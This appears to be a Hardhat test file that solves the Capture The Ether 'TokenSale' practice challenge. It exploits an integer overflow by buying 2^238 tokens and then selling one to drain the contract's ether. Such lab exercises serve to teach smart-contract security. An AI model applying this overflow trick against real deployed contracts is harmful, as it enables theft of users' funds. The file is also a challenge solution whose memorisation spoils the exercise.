const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Capture The Ether - TokenSale", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const CTETokenSaleChallenge = await ethers.getContractFactory(
      "CTETokenSaleChallenge"
    );
    const cteTokenSaleChallenge = await CTETokenSaleChallenge.deploy(
      deployer.address,
      {
        value: ethers.constants.WeiPerEther,
      }
    );
    await cteTokenSaleChallenge.deployed();

    return { deployer, cteTokenSaleChallenge };
  }

  describe("Exploit", function () {
    it("Deployer can drain contract ether", async function () {
      const { deployer, cteTokenSaleChallenge } = await loadFixture(
        deployToken
      );

      expect(await cteTokenSaleChallenge.isComplete()).to.equal(false);
      await cteTokenSaleChallenge.connect(deployer).buy(2n ** 238n);
      await cteTokenSaleChallenge.connect(deployer).sell(1);
      expect(await cteTokenSaleChallenge.isComplete()).to.equal(true);
    });
  });
});
